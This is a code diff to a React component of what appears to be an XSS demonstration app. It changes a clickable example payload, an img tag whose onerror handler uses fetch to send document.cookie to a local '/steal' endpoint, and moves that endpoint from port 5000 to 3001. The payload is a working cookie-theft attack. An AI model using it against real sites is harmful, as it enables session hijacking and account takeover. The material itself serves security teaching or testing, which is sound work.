@@ -38,8 +38,8 @@ function App() {
       {/* Example XSS payload to test */}
       <div className="input-container">
         <div className="input-label">Example XSS Payload (click to use)</div>
-        <code onClick={() => setNewComment('<img src="x" onerror="fetch(`http://localhost:5000/steal?cookies=${encodeURIComponent(document.cookie)}`)">')}>
-          {'<img src="x" onerror="fetch(`http://localhost:5000/steal?cookies=${encodeURIComponent(document.cookie)}`)">'}
+        <code onClick={() => setNewComment('<img src="x" onerror="fetch(`http://localhost:3001/steal?cookie=${encodeURIComponent(document.cookie)}`)">')}>
+          {'<img src="x" onerror="fetch(`http://localhost:3001/steal?cookie=${encodeURIComponent(document.cookie)}`)">'}
         </code>
       </div>
 
